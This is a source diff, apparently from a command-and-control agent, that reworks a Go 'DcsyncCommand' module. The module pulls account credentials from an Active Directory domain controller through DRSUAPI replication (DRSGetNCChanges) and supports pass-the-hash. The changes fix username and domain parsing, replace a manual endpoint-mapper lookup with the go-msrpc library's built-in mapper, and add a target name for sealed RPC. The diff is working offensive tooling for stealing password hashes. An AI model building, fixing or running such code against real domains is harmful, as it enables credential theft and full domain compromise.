@@ -5,6 +5,7 @@ import (
 	"encoding/binary"
 	"encoding/hex"
 	"fmt"
+	"net"
 	"strings"
 	"time"
 
@@ -12,7 +13,6 @@ import (
 
 	"github.com/oiweiwei/go-msrpc/dcerpc"
 	"github.com/oiweiwei/go-msrpc/midl/uuid"
-	"github.com/oiweiwei/go-msrpc/msrpc/dcetypes"
 	"github.com/oiweiwei/go-msrpc/msrpc/drsr/drsuapi/v4"
 	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
 	"github.com/oiweiwei/go-msrpc/msrpc/epm/epm/v3"
@@ -75,15 +75,15 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 		args.Timeout = 120
 	}
 
-	// Parse domain from username
-	if args.Domain == "" {
-		args.Domain, args.Username = parseDomainUser(args.Username)
-	}
-
-	// Format credential as DOMAIN\user for go-msrpc
-	credUser := args.Username
-	if args.Domain != "" {
-		credUser = args.Domain + `\` + args.Username
+	// Normalize username — always strip domain from UPN/downlevel formats
+	// to avoid double-domain when explicit domain param is also provided
+	explicitDomain := args.Domain
+	parsedDomain, parsedUser := parseDomainUser(args.Username)
+	args.Username = parsedUser
+	if explicitDomain != "" {
+		args.Domain = explicitDomain
+	} else {
+		args.Domain = parsedDomain
 	}
 
 	// Parse target accounts
@@ -107,60 +107,23 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 
 	timeout := time.Duration(args.Timeout) * time.Second
 
-	// Manual EPM lookup on separate insecure connection
-	epmCtx, epmCancel := context.WithTimeout(context.Background(), 15*time.Second)
-	epmConn, err := dcerpc.Dial(epmCtx, fmt.Sprintf("ncacn_ip_tcp:%s[135]", args.Server), dcerpc.WithInsecure())
-	if err != nil {
-		epmCancel()
-		return errorf("Error connecting to EPM on %s: %v", args.Server, err)
-	}
-	epmCli, err := epm.NewEpmClient(epmCtx, epmConn, dcerpc.WithInsecure())
-	if err != nil {
-		epmConn.Close(epmCtx)
-		epmCancel()
-		return errorf("Error creating EPM client on %s: %v", args.Server, err)
-	}
-	lookupResp, err := epmCli.Lookup(epmCtx, &epm.LookupRequest{
-		InquiryType: 0x00000001,
-		VersOption:  0x00000003,
-		InterfaceID: &dcetypes.InterfaceID{
-			UUID:      dtyp.GUIDFromUUID(drsuapi.DrsuapiSyntaxV4_0.IfUUID),
-			VersMajor: drsuapi.DrsuapiSyntaxV4_0.IfVersionMajor,
-			VersMinor: drsuapi.DrsuapiSyntaxV4_0.IfVersionMinor,
-		},
-		MaxEntries: 10,
-	})
-	epmConn.Close(epmCtx)
-	epmCancel()
-	if err != nil {
-		return errorf("Error looking up DRSUAPI endpoint on %s: %v", args.Server, err)
-	}
-
-	var drsuapiPort string
-	for _, entry := range lookupResp.Entries {
-		b := entry.Tower.Binding()
-		if b.StringBinding.ProtocolSequence == dcerpc.ProtocolSequenceIPTCP && b.StringBinding.Endpoint != "" {
-			drsuapiPort = b.StringBinding.Endpoint
-			break
-		}
-	}
-	if drsuapiPort == "" {
-		return errorResult("Error: DRSUAPI TCP endpoint not found via EPM")
-	}
-
-	// Use global credential approach (matching official example exactly)
-	gssapi.AddCredential(gssapi.NewCredential("", nil, gssapi.InitiateAndAccept, cred))
+	// Register credential globally (matching go-msrpc official drsr example)
+	gssapi.AddCredential(cred)
 
 	ctx, cancel := context.WithTimeout(gssapi.NewSecurityContext(context.Background()), timeout)
 	defer cancel()
 
-	cc, err := dcerpc.Dial(ctx, fmt.Sprintf("ncacn_ip_tcp:%s[%s]", args.Server, drsuapiPort))
+	cc, err := dcerpc.Dial(ctx, "ncacn_ip_tcp:"+args.Server,
+		epm.EndpointMapper(ctx,
+			net.JoinHostPort(args.Server, "135"),
+			dcerpc.WithInsecure(),
+		))
 	if err != nil {
-		return errorf("Error connecting to %s:%s via DCE-RPC: %v", args.Server, drsuapiPort, err)
+		return errorf("Error connecting to %s via DCE-RPC: %v", args.Server, err)
 	}
 	defer cc.Close(ctx)
 
-	cli, err := drsuapi.NewDrsuapiClient(ctx, cc, dcerpc.WithSeal())
+	cli, err := drsuapi.NewDrsuapiClient(ctx, cc, dcerpc.WithSeal(), dcerpc.WithTargetName(args.Server))
 	if err != nil {
 		return errorf("Error creating DRSUAPI client: %v", err)
 	}
@@ -229,7 +192,7 @@ func (c *DcsyncCommand) Execute(task structs.Task) structs.CommandResult {
 		authMethod = "PTH"
 	}
 	sb.WriteString(fmt.Sprintf("[*] DCSync via DRSGetNCChanges against %s (%s)\n", args.Server, authMethod))
-	sb.WriteString(fmt.Sprintf("[*] Credentials: %s\n", credUser))
+	sb.WriteString(fmt.Sprintf("[*] Credentials: %s\\%s\n", args.Domain, args.Username))
 	sb.WriteString(strings.Repeat("-", 60) + "\n")
 
 	successCount := 0
